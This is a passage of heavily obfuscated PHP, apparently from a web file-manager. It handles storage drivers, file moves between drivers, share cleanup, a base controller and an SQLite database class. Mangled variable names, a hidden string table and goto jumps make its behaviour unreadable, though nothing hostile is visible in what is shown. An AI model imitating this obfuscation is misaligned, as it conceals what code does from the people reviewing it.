implode($™Ï¹é­ù[50], $…ÊÈÏãÍ); $ŞïüñŞã = Cache::get($Õò„‹Ú½); if ($ŞïüñŞã) { return $ŞïüñŞã; } $òª²İ§Ï = array($™Ï¹é­ù[897] => $™Ï¹é­ù[478], $™Ï¹é­ù[2329] => $™Ï¹é­ù[79]); $Ûƒá¯Û¦ = array($™Ï¹é­ù[897] => array($™Ï¹é­ù[7], $…ÊÈÏãÍ)); $ŞïüñŞã = Model($™Ï¹é­ù[865])->field($òª²İ§Ï)->where($Ûƒá¯Û¦)->group($™Ï¹é­ù[897])->select(); $ŞïüñŞã = array_to_keyvalue($ŞïüñŞã, $™Ï¹é­ù[478], $™Ï¹é­ù[79]); Cache::set($Õò„‹Ú½, $ŞïüñŞã, 600); return $ŞïüñŞã; } public function getConfig($‚Ã•ğÜÉ) { $ç¼Éì = parent::listData($‚Ã•ğÜÉ); $ò¬ãè‚Œ = _get($ç¼Éì, $_SERVER[¼¥ÊĞÙÌ][6], array()); if ($ò¬ãè‚Œ && !is_array($ò¬ãè‚Œ)) { $ò¬ãè‚Œ = json_decode($ò¬ãè‚Œ, !0); } return $ò¬ãè‚Œ; } public function update($ÔµÁáù¼, $Éé¥šËæ) { $¡‰àö =& $_SERVER[¼¥ÊĞÙÌ]; $ôØ®ò¼Ì = $Éé¥šËæ[$¡‰àö[32]]; $ù–Ü¿šÈ = array_to_keyvalue(parent::listData(), $¡‰àö[32]); if (isset($ù–Ü¿šÈ[$ôØ®ò¼Ì]) && $ù–Ü¿šÈ[$ôØ®ò¼Ì][$¡‰àö[478]] != $ÔµÁáù¼) { return !1; } $this->checkPwd($ÔµÁáù¼, $Éé¥šËæ); if (isset($Éé¥šËæ[$¡‰àö[2330]]) && $Éé¥šËæ[$¡‰àö[2330]] == $¡‰àö[91]) { $this->checkConfig($Éé¥šËæ); } unset($Éé¥šËæ[$¡‰àö[2330]]); $ä•Š½÷á = parent::update($ÔµÁáù¼, $Éé¥šËæ); if ($ä•Š½÷á && $Éé¥šËæ[$¡‰àö[37]]) { foreach ($ù–Ü¿šÈ as $×’ºê ã) { if ($×’ºê ã[$¡‰àö[37]] && $×’ºê ã[$¡‰àö[478]] != $ÔµÁáù¼) { parent::update($×’ºê ã[$¡‰àö[478]], array($¡‰àö[37] => 0)); } } $this->updateBackup($ÔµÁáù¼, $ù–Ü¿šÈ); } return $ä•Š½÷á; } public function add($İ¯³ƒèœ) { $¬ó×¹Ä™ =& $_SERVER[¼¥ÊĞÙÌ]; $Í­øƒÎ = array_to_keyvalue(parent::listData(), $¬ó×¹Ä™[32]); if (isset($Í­øƒÎ[$İ¯³ƒèœ[$¬ó×¹Ä™[32]]])) { return !1; } $this->checkConfig($İ¯³ƒèœ); $˜÷ß¹³Î = parent::insert($İ¯³ƒèœ); if ($˜÷ß¹³Î && $İ¯³ƒèœ[$¬ó×¹Ä™[37]]) { foreach ($Í­øƒÎ as $Şàí³õ) { if ($Şàí³õ[$¬ó×¹Ä™[37]]) { parent::update($Şàí³õ[$¬ó×¹Ä™[478]], array($¬ó×¹Ä™[37] => 0)); } } $this->updateBackup($˜÷ß¹³Î, $Í­øƒÎ); } return $˜÷ß¹³Î; } public function updateBackup($ÌÄüÉ´ö, $„Şí–îÑ) { $¿¦Á°¬ =& $_SERVER[¼¥ÊĞÙÌ]; if ($ÌÄüÉ´ö == $¿¦Á°¬[91]) { return; } $”‰£ÊµÄ = Model($¿¦Á°¬[822])->config(); $¢¥ìê = $”‰£ÊµÄ[$¿¦Á°¬[826]]; if ($”‰£ÊµÄ[$¿¦Á°¬[1759]] != $¿¦Á°¬[91] || $¢¥ìê == $ÌÄüÉ´ö) { return; } if ($¢¥ìê != $¿¦Á°¬[91]) { $çı›ıÖ = array(); foreach ($„Şí–îÑ as $ş¡Îúåî) { if ($ÌÄüÉ´ö == $ş¡Îúåî[$¿¦Á°¬[478]]) { continue; } $çı›ıÖ[] = $ş¡Îúåî[$¿¦Á°¬[478]]; } if ($çı›ıÖ && in_array($¢¥ìê, $çı›ıÖ)) { return; } } $Šöñ²Ë = Model($¿¦Á°¬[844])->get($¿¦Á°¬[851]); $Šöñ²Ë = json_decode($Šöñ²Ë, !0); if (!$Šöñ²Ë) { return; } $Šöñ²Ë[$¿¦Á°¬[826]] = $ÌÄüÉ´ö; Model($¿¦Á°¬[844])->set(array($¿¦Á°¬[851] => $Šöñ²Ë)); } public function checkPwd($Îİ§ŸÅâ, &$øŞñÒê—) { $´Ä£¶°İ =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($øŞñÒê—[$´Ä£¶°İ[6]])) { return; } $ëïë¹˜ = $øŞñÒê—[$´Ä£¶°İ[6]]; if (!is_array($ëïë¹˜)) { $ëïë¹˜ = json_decode($ëïë¹˜, !0); } $çó íºê = $´Ä£¶°İ[12]; $îöï‚† = array($´Ä£¶°İ[2331], $´Ä£¶°İ[2332], $´Ä£¶°İ[975]); foreach ($îöï‚† as $å’Õ·ƒ¥) { if (isset($ëïë¹˜[$å’Õ·ƒ¥])) { $çó íºê = $å’Õ·ƒ¥; break; } } if (!$çó íºê) { return; } $Ÿ´Â¹ù— = $this->getConfig($Îİ§ŸÅâ); $ú­°Ä„… = $Ÿ´Â¹ù—[$çó íºê]; $ü„óİ‰ó = $ëïë¹˜[$çó íºê]; if ($ü„óİ‰ó == str_repeat($´Ä£¶°İ[223], strlen($ú­°Ä„…))) { $ëïë¹˜[$çó íºê] = $ú­°Ä„…; $øŞñÒê—[$´Ä£¶°İ[6]] = json_encode($ëïë¹˜); } else { if ($ü„óİ‰ó != $ú­°Ä„…) { $øŞñÒê—[$´Ä£¶°İ[2330]] = $´Ä£¶°İ[91]; } } } public function checkConfig(&$èäŒÛŒ, $·ğàñÃø = false) { $³åßÇ– =& $_SERVER[¼¥ÊĞÙÌ]; $Ö÷° ø = strtolower($èäŒÛŒ[$³åßÇ–[98]]); $¶¦êÃâÁ = $èäŒÛŒ[$³åßÇ–[6]]; if (!is_array($¶¦êÃâÁ)) { $¶¦êÃâÁ = json_decode($¶¦êÃâÁ, !0); } foreach ($¶¦êÃâÁ as $ƒ¥´ê®‘ => $¤®„÷›) { if (is_string($¤®„÷›)) { $¶¦êÃâÁ[$ƒ¥´ê®‘] = trim($¤®„÷›); } } $¶¦êÃâÁ[$³åßÇ–[2333]] = rand_string(6); $š×ˆ­‹ü = $GLOBALS[$³åßÇ–[6]][$³åßÇ–[92]][$³åßÇ–[905]]; $ÓÒ¦‡åä = isset($š×ˆ­‹ü[$Ö÷° ø]) ? $š×ˆ­‹ü[$Ö÷° ø] : ucfirst($Ö÷° ø); $·º‘Ñ÷ = $³åßÇ–[77] . $ÓÒ¦‡åä; if (!$ÓÒ¦‡åä || !class_exists($·º‘Ñ÷)) { if ($·ğàñÃø) { return LNG($³åßÇ–[2334]); } write_log(array($³åßÇ–[2335], $èäŒÛŒ, get_caller_info()), $³åßÇ–[216]); show_json(LNG($³åßÇ–[2334]), !1, $èäŒÛŒ); } $Óš¾’† = new $·º‘Ñ÷($¶¦êÃâÁ); $œ‘Ô•Å = rtrim($¶¦êÃâÁ[$³åßÇ–[1274]], $³åßÇ–[8]) . $³åßÇ–[8]; if (in_array($Ö÷° ø, $Óš¾’†->objectDriver)) { try { if (!$Óš¾’†->isBucketCors() && !$Óš¾’†->setBucketCors()) { $ñìÖ¨˜ä = LNG($³åßÇ–[2336]); $ñìÖ¨˜ä .= $³åßÇ–[2337] . LNG($³åßÇ–[2338]); } } catch (Exception $Ïì½¼Ç) { $ñìÖ¨˜ä = $Ïì½¼Ç->getMessage(); } if (isset($ñìÖ¨˜ä)) { return $this->_parseError($ñìÖ¨˜ä, $Ö÷° ø, $·ğàñÃø); } if ($Ö÷° ø == $³åßÇ–[68] && !$Óš¾’†->checkRegion()) { return $this->_parseError(LNG($³åßÇ–[2339]), $Ö÷° ø, $·ğàñÃø); } } else { if ($Ö÷° ø == $³åßÇ–[2340]) { if ($Óš¾’†->ftpPath) { $ ¤ù©†» = trim($œ‘Ô•Å, $³åßÇ–[8]); if (stripos($ ¤ù©†», trim($Óš¾’†->ftpPath, $³åßÇ–[8])) !== 0) { $œ‘Ô•Å = $Óš¾’†->ftpPath . $³åßÇ–[8] . ($ ¤ù©†» ? $ ¤ù©†» . $³åßÇ–[8] : $³åßÇ–[12]); } } } } $õ¼ì©» = $Óš¾’†->getPath($œ‘Ô•Å . $³åßÇ–[1278]); try { if ($Ö÷° ø == $³åßÇ–[109]) { $Óš¾’†->mkdir($œ‘Ô•Å); } $¥Ï¸È®† = $Óš¾’†->mkfile($õ¼ì©»); if (!$¥Ï¸È®†) { $ñìÖ¨˜ä = LNG($³åßÇ–[2336]); } } catch (Exception $Ïì½¼Ç) { $ñìÖ¨˜ä = $Ïì½¼Ç->getMessage(); } if (isset($ñìÖ¨˜ä)) { return $this->_parseError($ñìÖ¨˜ä, $Ö÷° ø, $·ğàñÃø); } $¶¦êÃâÁ[$³åßÇ–[1274]] = $œ‘Ô•Å; $èäŒÛŒ[$³åßÇ–[6]] = json_encode($¶¦êÃâÁ); $èäŒÛŒ[$³åßÇ–[98]] = $ÓÒ¦‡åä; return !0; } private function _parseError($öµÙ”Şö, $¨Âú°Ùí, $®Õà…ó = false) { $×÷÷¯æí =& $_SERVER[¼¥ÊĞÙÌ]; if ($¨Âú°Ùí == $×÷÷¯æí[68] && stripos($öµÙ”Şö, $×÷÷¯æí[2341])) { $¸„ã„×å = explode($×÷÷¯æí[10], $öµÙ”Şö); $›ñÏÕ¢ = isset($¸„ã„×å[1]) ? $¸„ã„×å[1] : $×÷÷¯æí[12]; $µ¶‘«¤ = array($×÷÷¯æí[2342] => LNG($×÷÷¯æí[2343]), $×÷÷¯æí[2344] => LNG($×÷÷¯æí[2345])); if (isset($µ¶‘«¤[$›ñÏÕ¢])) { $öµÙ”Şö = $µ¶‘«¤[$›ñÏÕ¢]; } } if (stripos($öµÙ”Şö, $×÷÷¯æí[2346]) === 0) { $¬êÑ‰¸” = strpos($öµÙ”Şö, $×÷÷¯æí[178]); if ($¬êÑ‰¸” === !1) { $¬êÑ‰¸” = strpos($öµÙ”Şö, $×÷÷¯æí[4]); } if ($¬êÑ‰¸” !== !1) { $öµÙ”Şö = substr($öµÙ”Şö, $¬êÑ‰¸” + 1); } } $öµÙ”Şö = LNG($×÷÷¯æí[1281]) . $öµÙ”Şö; if ($®Õà…ó) { return $öµÙ”Şö; } show_json($öµÙ”Şö, !1); } public function driverListSystem() { $óéÄÏêÅ =& $_SERVER[¼¥ÊĞÙÌ]; $ÈèÀ¹şØ = parent::listData(); $Û³ğî’Ù = array(); foreach ($ÈèÀ¹şØ as $Â“İØ¬À) { unset($Â“İØ¬À[$óéÄÏêÅ[234]], $Â“İØ¬À[$óéÄÏêÅ[88]]); if (!is_array($Â“İØ¬À[$óéÄÏêÅ[6]])) { $Â“İØ¬À[$óéÄÏêÅ[6]] = json_decode($Â“İØ¬À[$óéÄÏêÅ[6]], !0); } $Û³ğî’Ù[] = $Â“İØ¬À; } return $Û³ğî’Ù; } public function defaultDriver() { $¡øÀ©’õ =& $_SERVER[¼¥ÊĞÙÌ]; $¢Š°Ä¥ü = parent::listData(); $ä¶øœê = array_filter_by_field($¢Š°Ä¥ü, $¡øÀ©’õ[37], 1); $ä¶øœê = $ä¶øœê[0]; if (!$ä¶øœê) { return array(); } if (!is_array($ä¶øœê[$¡øÀ©’õ[6]])) { $ä¶øœê[$¡øÀ©’õ[6]] = json_decode($ä¶øœê[$¡øÀ©’õ[6]], !0); } return $ä¶øœê; } public function driverInfo($„¤ˆŸ­Ã) { $“ÓŠŸ» =& $_SERVER[¼¥ÊĞÙÌ]; $Ãµ©€¤× = array_to_keyvalue(parent::listData(), $“ÓŠŸ»[478]); if (!isset($Ãµ©€¤×[$„¤ˆŸ­Ã])) { return !1; } $á£Õ¶­ = $Ãµ©€¤×[$„¤ˆŸ­Ã]; if (!is_array($á£Õ¶­[$“ÓŠŸ»[6]])) { $á£Õ¶­[$“ÓŠŸ»[6]] = json_decode($á£Õ¶­[$“ÓŠŸ»[6]], !0); } return $á£Õ¶­; } public function remove($»Š¶ÖŒ) { $this->removeShareItems($»Š¶ÖŒ); return parent::remove($»Š¶ÖŒ); } public function removeWithFile($í«»«¦, $’ÆÁ†Æ–, $ÇÈŠìàò, $üª ŞÉ‹ = false) { $çÜç²© =& $_SERVER[¼¥ÊĞÙÌ]; $Î¯­ÒÜ… = array($çÜç²©[897] => $í«»«¦); $¾ù®á±ò = Model($çÜç²©[549])->where($Î¯­ÒÜ…)->count(); $Ã­Ğ•á = Model($çÜç²©[549])->where($Î¯­ÒÜ…)->sum($çÜç²©[79]); $À›ôğ‡ö = $’ÆÁ†Æ– . $çÜç²©[2347] . $í«»«¦; $Ÿ“Ó­Æ˜ = LNG($’ÆÁ†Æ– == $çÜç²©[628] ? $çÜç²©[2348] : $çÜç²©[2349]); $¯©¦¼˜œ = new TaskFileTransfer($À›ôğ‡ö, $çÜç²©[216], $¾ù®á±ò, $Ÿ“Ó­Æ˜ . $çÜç²©[465] . $ÇÈŠìàò[$çÜç²©[32]] . $çÜç²©[215] . $í«»«¦); $¯©¦¼˜œ->task[$çÜç²©[837]] = (double) $Ã­Ğ•á; $‡‰Ôæ¾ = KodIO::defaultDriver(); $º§–Ã©ï = $‡‰Ôæ¾[$çÜç²©[478]]; $ÔÃ–Ö²¬ = $Ö±¯¸à = $„˜Šû³Ü = array(); $é¦ïÀ±ş = Model($çÜç²©[233])->where($Î¯­ÒÜ…)->field($çÜç²©[2350])->select(); foreach ($é¦ïÀ±ş as $©¢«¶È¡) { $ú•¥å  = $©¢«¶È¡[$çÜç²©[546]]; if ($üª ŞÉ‹) { $Ö±¯¸à[] = $ú•¥å ; continue; } $Ì°­äç = $©¢«¶È¡[$çÜç²©[87]]; $Ïâ†ÖÈ… = get_path_father($Ì°­äç); $„˜Šû³Ü[] = $Ïâ†ÖÈ…; $Ïâ†ÖÈ… = str_replace("\173\x69\157\x3a{$í«»«¦}\x7d\x2f", "\173\x69\x6f\x3a{$º§–Ã©ï}\x7d\x2f", $Ïâ†ÖÈ…); if (!IO::exist($Ì°­äç)) { $ÔÃ–Ö²¬[] = $ú•¥å ; $¯©¦¼˜œ->updateFileEnd($©¢«¶È¡[$çÜç²©[32]], $©¢«¶È¡[$çÜç²©[79]]); write_log($çÜç²©[2351] . $Ì°­äç, $çÜç²©[1923]); continue; } $Ğƒ·š‹ = IO::move($Ì°­äç, $Ïâ†ÖÈ…, REPEAT_RENAME); if (!$Ğƒ·š‹) { $Ö±¯¸à[] = $ú•¥å ; $¯©¦¼˜œ->updateFileEnd($©¢«¶È¡[$çÜç²©[32]], $©¢«¶È¡[$çÜç²©[79]]); write_log($çÜç²©[2352] . $Ì°­äç, $çÜç²©[1923]); continue; } $Î¯­ÒÜ… = array($çÜç²©[546] => $ú•¥å ); $²ã¯»èô = array($çÜç²©[897] => $º§–Ã©ï, $çÜç²©[87] => $Ğƒ·š‹); Model($çÜç²©[233])->where($Î¯­ÒÜ…)->save($²ã¯»èô); } $½Øæšò = $¯©¦¼˜œ->task; if (!$üª ŞÉ‹) { Cache::set($À›ôğ‡ö, $½Øæšò); } $¯©¦¼˜œ->end(); $ÔÃ–Ö²¬ = array_unique($ÔÃ–Ö²¬); $Ö±¯¸à = array_unique($Ö±¯¸à); if (!$üª ŞÉ‹ && ($ÔÃ–Ö²¬ || $Ö±¯¸à)) { $•ƒüİ§¹ = array(); if ($ÔÃ–Ö²¬) { $•ƒüİ§¹[] = sprintf(LNG($çÜç²©[2353]), count($ÔÃ–Ö²¬)); } if ($Ö±¯¸à) { $•ƒüİ§¹[] = sprintf(LNG($çÜç²©[2354]), count($Ö±¯¸à)); } $•ƒüİ§¹ = sprintf(LNG($çÜç²©[2355]), implode($çÜç²©[2356], $•ƒüİ§¹)) . $çÜç²©[2357] . date($çÜç²©[2358]) . $çÜç²©[2359]; if ($’ÆÁ†Æ– == $çÜç²©[1960]) { $•ƒüİ§¹ .= $çÜç²©[2360] . LNG($çÜç²©[2361]); } else { $•ƒüİ§¹ = LNG($çÜç²©[2362]) . $çÜç²©[2363] . $•ƒüİ§¹; } $½Øæšò[$çÜç²©[1276]] = $•ƒüİ§¹; Cache::set($À›ôğ‡ö, $½Øæšò); unset($ÇÈŠìàò[$çÜç²©[6]]); $³Ùì·¨ = array($çÜç²©[478] => $í«»«¦, $çÜç²©[2231] => $çÜç²©[628], $çÜç²©[32] => $ÇÈŠìàò[$çÜç²©[32]], $çÜç²©[98] => $ÇÈŠìàò[$çÜç²©[98]]); Hook::trigger($çÜç²©[1801], array($çÜç²©[1299] => $³Ùì·¨, $çÜç²©[1309] => !0)); show_json($•ƒüİ§¹, !1, 100111); } if ($’ÆÁ†Æ– == $çÜç²©[628]) { return !0; } if ($ÔÃ–Ö²¬ || $Ö±¯¸à) { $ÁØİİ«ä = array_merge($ÔÃ–Ö²¬, $Ö±¯¸à); $ÁØİİ«ä = array_filter(array_unique($ÁØİİ«ä)); $this->removeByFileID($ÁØİİ«ä); } if ($„˜Šû³Ü) { $„˜Šû³Ü = array_filter(array_unique($„˜Šû³Ü)); foreach ($„˜Šû³Ü as $Ì°­äç) { $—Ú†Şøş = IO::has($Ì°­äç, !0); if (!$—Ú†Şøş[$çÜç²©[242]] && !$—Ú†Şøş[$çÜç²©[243]]) { IO::remove($Ì°­äç); } } } return $this->remove($í«»«¦); } private function removeByFileID($†ª’ªô® = array()) { $„ÓîŠ¤Ë =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($†ª’ªô®)) { return; } $Ş…Øë©Ó = array($„ÓîŠ¤Ë[546] => array($„ÓîŠ¤Ë[7], $†ª’ªô®)); $Ÿ­‘À¼ = Model($„ÓîŠ¤Ë[1440])->where($Ş…Øë©Ó)->field($„ÓîŠ¤Ë[2308])->select(); if (!$Ÿ­‘À¼) { return Model($„ÓîŠ¤Ë[549])->remove($†ª’ªô®); } $Ÿ­‘À¼ = array_to_keyvalue($Ÿ­‘À¼, $„ÓîŠ¤Ë[194], $„ÓîŠ¤Ë[546]); foreach ($Ÿ­‘À¼ as $—±¸û÷­ => $§ˆûÆ¬Ç) { Model($„ÓîŠ¤Ë[904])->removeNow($—±¸û÷­, !1); } $±›‹ŒçË = array_diff($†ª’ªô®, array_unique(array_values($Ÿ­‘À¼))); if ($±›‹ŒçË) { return Model($„ÓîŠ¤Ë[549])->remove($±›‹ŒçË); } } private function removeShareItems($Ï‚™ñ×õ) { $±şÏ”Î° =& $_SERVER[¼¥ÊĞÙÌ]; $ª®¤¶ = "\x7b\151\x6f\72{$Ï‚™ñ×õ}\175\x2f"; $„‡¼¼á¡ = array($±şÏ”Î°[194] => 0, $±şÏ”Î°[1269] => array($±şÏ”Î°[462], "{$ª®¤¶}\x25")); $‘Ïï¾»› = Model($±şÏ”Î°[1971])->where($„‡¼¼á¡)->field($±şÏ”Î°[673])->select(); if (empty($‘Ïï¾»›)) { return; } $¨¹Åäí¤ = array_to_keyvalue($‘Ïï¾»›, $±şÏ”Î°[12], $±şÏ”Î°[673]); Model($±şÏ”Î°[672])->remove($¨¹Åäí¤); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\x4c\x69\147\150\164\x41\x70\160"; public $modelType = "\x53\171\x73\x74\145\x6d\117\x70\x74\x69\157\x6e"; public $field = array("\x6e\141\155\x65", "\147\x72\x6f\x75\x70", "\x64\x65\163\x63", "\x63\x6f\x6e\x74\145\x6e\x74"); public function listData($î†œá“ì = false, $‹Ö ŠæÌ = "\155\157\x64\151\146\x79\x54\151\x6d\145", $¬µò£ê = true) { return parent::listData($î†œá“ì, $‹Ö ŠæÌ, $¬µò£ê); } public function remove($‰®Ì¨ª) { $–³’Ò† = $this->findByName($‰®Ì¨ª); if (!$–³’Ò†) { return !1; } return parent::remove($–³’Ò†[$_SERVER[¼¥ÊĞÙÌ][478]]); } public function add($ÆÊÇÍî´) { if ($this->findByName($ÆÊÇÍî´[$_SERVER[¼¥ÊĞÙÌ][32]])) { return !1; } return parent::insert($ÆÊÇÍî´); } public function update($Õ€İõß, $‰ğÊô—¶) { $Œö†âëÊ =& $_SERVER[¼¥ÊĞÙÌ]; $¯Êø®™— = $this->findByName($Õ€İõß); $¯ßÙ·â  = $this->findByName($‰ğÊô—¶[$Œö†âëÊ[32]]); if (!$¯Êø®™— || $¯ßÙ·â  && $¯ßÙ·â [$Œö†âëÊ[478]] != $¯Êø®™—[$Œö†âëÊ[478]]) { return !1; } return parent::update($¯Êø®™—[$Œö†âëÊ[478]], $‰ğÊô—¶); } } goto F“¨òõˆ; b‘áŠªçƒğ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÛÀî¡ô =& $_SERVER[¼¥ÊĞÙÌ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÛÀî¡ô[6]] =& $config; $this->values[$ÛÀî¡ô[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÛÀî¡ô[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($„³¼ôíş) { if (1 === func_num_args()) { $this->{$„³¼ôíş} = new $„³¼ôíş(); } else { $”Î“ÖĞ— = new ReflectionClass($„³¼ôíş); $Ÿ‡‚ÔÃ = func_get_args(); array_shift($Ÿ‡‚ÔÃ); $this->{$„³¼ôíş} = $”Î“ÖĞ—->newInstanceArgs($Ÿ‡‚ÔÃ); } return $this->{$„³¼ôíş}; } public function routeBind($¹…ƒİÊ, $£áŒôä±, $Œµİ’Š = 3) { $²İ¿ôÑ =& $_SERVER[¼¥ÊĞÙÌ]; $ÕÓà£‰ = $this->in[$²İ¿ôÑ[9]]; $¹…ƒİÊ = str_replace($²İ¿ôÑ[10], $²İ¿ôÑ[11], trim(trim($¹…ƒİÊ, $²İ¿ôÑ[8]), $²İ¿ôÑ[12])); if (!$¹…ƒİÊ || count($ÕÓà£‰) <= $Œµİ’Š) { return !1; } $´Õó±Å = !0; $îÔçßÅ = explode($²İ¿ôÑ[8], $¹…ƒİÊ); for ($‹¬ÓÚ = 0; $‹¬ÓÚ < count($îÔçßÅ); $‹¬ÓÚ++) { if ($îÔçßÅ[$‹¬ÓÚ] != $ÕÓà£‰[$Œµİ’Š + $‹¬ÓÚ]) { $´Õó±Å = !1; break; } } if (!$´Õó±Å) { return; } call_user_func_array(array($this, $£áŒôä±), array()); } public function routeArgs($–şœŒêê = 3) { $ëùÜ¸Ëœ = $this->in[$_SERVER[¼¥ÊĞÙÌ][9]]; if (count($ëùÜ¸Ëœ) <= $–şœŒêê) { return array(); } $Äõ¶ÓÔè = array(); for ($Ø÷Œâø = $–şœŒêê; $Ø÷Œâø < count($ëùÜ¸Ëœ); $Ø÷Œâø += 2) { $Äõ¶ÓÔè[$ëùÜ¸Ëœ[$Ø÷Œâø]] = $ëùÜ¸Ëœ[$Ø÷Œâø + 1]; $this->in[$ëùÜ¸Ëœ[$Ø÷Œâø]] = $ëùÜ¸Ëœ[$Ø÷Œâø + 1]; } return $Äõ¶ÓÔè; } protected function assign($ˆäê¯ü´, $˜Ğ£ãÙ) { $this->values[$ˆäê¯ü´] = $˜Ğ£ãÙ; } protected function display($ˆ²¨™‡á) { ob_end_clean(); extract($this->values); require $this->tpl . $ˆ²¨™‡á; } } class DbSqliteBase extends Db { public function __construct($ü¤®€‰ = '') { $ÍÃ† Å =& $_SERVER[¼¥ÊĞÙÌ]; if (!extension_loaded($ÍÃ† Å[13])) { think_exception(think_lang($ÍÃ† Å[14]) . $ÍÃ† Å[15]); } if (!empty($ü¤®€‰)) { if (!isset($ü¤®€‰[$ÍÃ† Å[16]])) { $ü¤®€‰[$ÍÃ† Å[16]] = 438; } $this->config = $ü¤®€‰; if (empty($this->config[$ÍÃ† Å[17]])) { $this->config[$ÍÃ† Å[17]] = array(); } } } public function connect($é¾éíİÃ = '', $£ÜÅÅÂã = 0) { $Àæğñïâ =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($this->linkID[$£ÜÅÅÂã])) { if (empty($é¾éíİÃ)) { $é¾éíİÃ = $this->config; } $Õ¿ ¥¢ = !empty($é¾éíİÃ[$Àæğñïâ[17]][$Àæğñïâ[18]]) ? $é¾éíİÃ[$Àæğñïâ[17]][$Àæğñïâ[18]] : $this->pconnect; $Ğ´ŞÂğƒ = $Õ¿ ¥¢ ? $Àæğñïâ[19] : $Àæğñïâ[20]; $this->linkID[$£ÜÅÅÂã] = $Ğ´ŞÂğƒ($é¾éíİÃ[$Àæğñïâ[21]], $é¾éíİÃ[$Àæğñïâ[16]]); if (!$this->linkID[$£ÜÅÅÂã]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$£ÜÅÅÂã], 30000); if (1 != think_config($Àæğñïâ[22])) { unset($this->config); } } return $this->linkID[$£ÜÅÅÂã]; } public function free() { $this->queryID = null; } public function query($÷¶êåş£) { $¼éØŒäã =& $_SERVER[¼¥ÊĞÙÌ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $÷¶êåş£; if ($this->queryID) { $this->free(); } think_action_status($¼éØŒäã[23], 1); think_status($¼éØŒäã[24]); $this->queryID = sqlite_query($this->_linkID, $÷¶êåş£); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ôßìê¬» = $this->getAll(); return $ôßìê¬»; } } public function execute($¡å ¥‘) { $¿Â‡¦¶ì =& $_SERVER[¼¥ÊĞÙÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¡å ¥‘; if ($this->queryID) { $this->free(); } think_action_status($¿Â‡¦¶ì[25], 1); think_status($¿Â‡¦¶ì[24]); $çª‰—‘î = sqlite_exec($this->_linkID, $¡å ¥‘); $this->debug(); if (!1 === $çª‰—‘î) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¼¥ÊĞÙÌ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÁÑ¨±¾ = sqlite_query($this->_linkID, $_SERVER[¼¥ÊĞÙÌ][27]); if (!$ÁÑ¨±¾) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÓÔó˜Ñƒ = sqlite_query($this->_linkID, $_SERVER[¼¥ÊĞÙÌ][28]); if (!$ÓÔó˜Ñƒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Üİñûì = array(); if ($this->numRows > 0) { for ($Ï”ü‰à = 0; $Ï”ü‰à < $this->numRows; $Ï”ü‰à++) { $Üİñûì[$Ï”ü‰à] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Üİñûì; } public function getFields($àË¹šè) { $Š¸„Ãİø =& $_SERVER[¼¥ÊĞÙÌ]; $¼£†é„ã = $this->query($Š¸„Ãİø[29] . $àË¹šè . $Š¸„Ãİø[30]); $À¨«âÙĞ = array(); if ($¼£†é„ã) { foreach ($¼£†é„ã as $ïşø©¡– => $ÚÚïûÍ±) { $À¨«âÙĞ[$ÚÚïûÍ±[$Š¸„Ãİø[31]]] = array($Š¸„Ãİø[32] => $ÚÚïûÍ±[$Š¸„Ãİø[31]], $Š¸„Ãİø[33] => $ÚÚïûÍ±[$Š¸„Ãİø[34]], $Š¸„Ãİø[35] => (bool) ($ÚÚïûÍ±[$Š¸„Ãİø[36]] === $Š¸„Ãİø[12]), $Š¸„Ãİø[37] => $ÚÚïûÍ±[$Š¸„Ãİø[38]], $Š¸„Ãİø[39] => strtolower($ÚÚïûÍ±[$Š¸„Ãİø[40]]) == $Š¸„Ãİø[41], $Š¸„Ãİø[42] => strtolower($ÚÚïûÍ±[$Š¸„Ãİø[43]]) == $Š¸„Ãİø[44]); } } return $À¨«âÙĞ; } public function getTables($‚·±Òßì = '') { $æÒ—²×« =& $_SERVER[¼¥ÊĞÙÌ]; $ş‰±úï¸ = $this->query($æÒ—²×«[45] . $æÒ—²×«[46] . $æÒ—²×«[47]); $É‹¤îâÌ = array(); foreach ($ş‰±úï¸ as $ç®¤û³” => $¨ëĞÔ×Ü) { $É‹¤îâÌ[$ç®¤û³”] = current($¨ëĞÔ×Ü); } return $É‹¤îâÌ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $º¬¿Êé =& $_SERVER[¼¥ÊĞÙÌ]; $ô·µ‰İî = sqlite_last_error($this->_linkID); $this->error = $ô·µ‰İî . $º¬¿Êé[4] . sqlite_error_string($ô·µ‰İî); if ($º¬¿Êé[12] != $this->queryStr) { $this->error .= LNG($º¬¿Êé[48]) . $this->queryStr; } think_trace($this->error, $º¬¿Êé[12], $º¬¿Êé[49]); return $this->error; } public function escapeString($‰àñïË¶) { return sqlite_escape_string($‰àñïË¶); } public function parseLimit($öÓ¡¢‡) { $Úñşº™ =& $_SERVER[¼¥ÊĞÙÌ]; $Ùä§ÚÇ‹ = $Úñşº™[12]; if (!empty($öÓ¡¢‡)) { $öÓ¡¢‡ = explode($Úñşº™[50], $öÓ¡¢‡); if (count($öÓ¡¢‡) > 1) { $Ùä§ÚÇ‹ .= $Úñşº™[51] . $öÓ¡¢‡[1] . $Úñşº™[52] . $öÓ¡¢‡[0] . $Úñşº™[53]; } else { $Ùä§ÚÇ‹ .= $Úñşº™[51] . $öÓ¡¢‡[0] . 